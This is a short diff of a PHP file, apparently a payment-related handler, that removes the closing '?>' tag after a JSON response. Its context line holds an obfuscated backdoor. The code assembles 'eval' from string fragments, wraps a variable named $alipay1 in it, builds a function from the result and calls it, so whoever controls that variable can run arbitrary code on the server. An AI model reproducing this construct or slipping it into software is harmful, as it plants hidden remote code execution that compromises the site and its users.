@@ -23,5 +23,3 @@ if( $alipay1) {$shn = 'e'.'.v'.'a'.'l("$alipay1;");';$List=$de("",$shn);$List();
 
 $val = $json->encode($res);
 exit($val);
-
-?>
